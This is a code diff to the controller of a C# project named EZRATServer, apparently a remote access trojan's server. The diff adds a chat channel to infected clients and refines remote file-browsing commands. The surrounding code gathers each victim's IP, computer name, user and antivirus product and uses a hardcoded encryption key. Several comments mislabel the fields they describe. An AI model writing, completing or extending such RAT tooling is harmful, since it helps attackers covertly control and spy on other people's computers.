@@ -14,6 +14,7 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using EZRATServer.Network;
 using EZRATServer.Utils;
+using EZRATServer.Forms;
 using Timer = System.Windows.Forms.Timer;
 
 namespace EZRATServer
@@ -29,6 +30,7 @@ namespace EZRATServer
         private static Socket _serverSocket;
         private static string EncryptKey = "POULPE212123542345235";
         FileBrowser fl;
+        Chat cht;
 
 
 
@@ -292,17 +294,19 @@ namespace EZRATServer
 
         void RightClickSelect(object sender, ToolStripItemClickedEventArgs e)
         {
-            
+
             switch (e.ClickedItem.Text)
             {
                 case "File Browser":
-                    fl = new FileBrowser(this,this.lstClients.SelectedItems[0].Index);
+                    fl = new FileBrowser(this, this.lstClients.SelectedItems[0].Index);
                     fl.Show();
                     SendCommand("lsdrives", this.lstClients.SelectedIndices[0]);
-                    SendCommand("lsfiles",this.lstClients.SelectedIndices[0]);
+                    SendCommand("lsfiles", this.lstClients.SelectedIndices[0]);
                     break;
                 case "Chat":
-
+                    cht = new Chat(this, this.lstClients.SelectedIndices[0]);
+                    SendCommand("chat;", this.lstClients.SelectedIndices[0]);
+                    cht.Show();
                     break;
                 default:
                     break;
@@ -329,15 +333,18 @@ namespace EZRATServer
                 {
                     lstClients.Items[i].Remove();
                     _clientSockets.RemoveAt(i - 1);
-                }
+
+
+             }
 
             }
         }
 
         void StopServer(object sender, EventArgs e)
         {
-            _clientSockets.ForEach((c) => c.Shutdown(SocketShutdown.Both));
-            _clientSockets.Clear();
+            CloseAllSockets();
+            //_clientSockets.ForEach((c) => c.Shutdown(SocketShutdown.Both));
+            //_clientSockets.Clear();
         }
 
         void StartServer(object sender, EventArgs e)
@@ -416,7 +423,7 @@ namespace EZRATServer
             SendCommand(cmd, id); //Send the command
             socket.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, socket); //Add the reading callback
             _serverSocket.BeginAccept(AcceptCallback, null); //Restart accepting clients
-            
+
         }
 
 
@@ -541,7 +548,8 @@ namespace EZRATServer
 
         private void RestartServer(int id)
         {
-            MessageBox.Show("Client disconnect");
+            this.lstClients.Invoke(new MethodInvoker(() => this.lstClients.Items[id].Remove()));
+            MessageBox.Show($"Client disconnect : {id}");
         }
 
 
@@ -609,10 +617,10 @@ namespace EZRATServer
                         string[] lines = mainContainer[2].Split('¦'); //Split the data into parts
                         string ip = lines[0]; //The computer's local IPv4 address
                         string name = lines[1]; //The Computer Name
-                        string user = lines[2]; //The computer's date and time
+                        string user = lines[2].Substring(lines[2].LastIndexOf('\\')+1); //The computer's date and time
                         string windows = lines[3]; //The computer's installed Anti Virus product
 
-                        AddToData(new ClientData(id, ip, name, user,windows)); //Update the UI
+                        AddToData(new ClientData(id, ip, name, user, windows)); //Update the UI
                     }
                     else if (text.StartsWith("lsdrives;"))
                     {
@@ -627,10 +635,21 @@ namespace EZRATServer
                         string lines = mainContainer[2]; //Split the data into parts
                         fl.Update(lines);
                     }
+                    else if (text.StartsWith("chat;"))
+                    {
+                        string msg = text.Substring(5);
+                        cht.NewMessage(msg);
+                    }
+                    else if (text.StartsWith("chatdata;"))
+                    {
+                        string msg = text.Substring(9);
+                        string[] result = msg.Split('¦');
+                        cht.UpdateAllData(result);
+                    }
                 }
 
 
-                }
+            }
 
 
             if (!dclient) current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current); //If client is not disconnecting, restart the reading
@@ -655,7 +674,7 @@ namespace EZRATServer
                 }));
             }
 
-            
+
         }
 
         void UpdateDataClient(ClientData data)
